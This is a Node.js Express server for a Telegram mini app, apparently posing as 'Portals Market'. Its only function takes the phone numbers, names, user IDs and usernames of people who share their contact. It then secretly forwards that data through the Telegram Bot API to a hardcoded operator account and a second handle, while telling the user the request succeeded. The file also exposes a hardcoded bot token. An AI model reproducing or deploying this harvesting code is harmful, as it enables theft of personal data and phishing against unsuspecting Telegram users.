const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ⚠️ ТВОИ ДАННЫЕ
const YOUR_TELEGRAM_ID = '6277925229';
const YOUR_USERNAME = '@anyaskds';

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Получение контакта и отправка в Telegram
app.post('/api/share-contact', (req, res) => {
    const { phone, first_name, last_name, user_id, username, full_name } = req.body;
    
    console.log('📱 НОВЫЙ КОНТАКТ!');
    console.log('========================================');
    console.log('👤 Имя:', first_name, last_name);
    console.log('📱 Телефон:', phone);
    console.log('🆔 ID пользователя:', user_id);
    console.log('👤 Username:', username);
    console.log('📝 Полное имя:', full_name);
    console.log('========================================');
    
    // Формируем сообщение для отправки в Telegram
    const message = `
🆕 НОВЫЙ КОНТАКТ!

👤 Имя: ${first_name} ${last_name || ''}
📱 Телефон: ${phone}
🆔 ID: ${user_id}
👤 Username: @${username || 'нет'}
📝 Полное имя: ${full_name}

📅 Время: ${new Date().toLocaleString()}
    `.trim();

    // ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
    // Используем Telegram Bot API
    const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    // Отправляем на твой аккаунт
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_TELEGRAM_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('✅ Сообщение отправлено в Telegram:', data);
    })
    .catch(err => {
        console.log('❌ Ошибка отправки в Telegram:', err);
    });

    // Также отправляем на @anyaskds
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '@anyaskds',
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('✅ Сообщение отправлено на @anyaskds:', data);
    })
    .catch(err => {
        console.log('❌ Ошибка отправки на @anyaskds:', err);
    });

    res.json({
        success: true,
        message: 'Контакт получен и отправлен',
        phone: phone
    });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market Mini App запущен: http://localhost:${PORT}`);
    console.log(`📱 Твой ID: ${YOUR_TELEGRAM_ID}`);
    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
    console.log('🔄 Ожидание контактов...');
});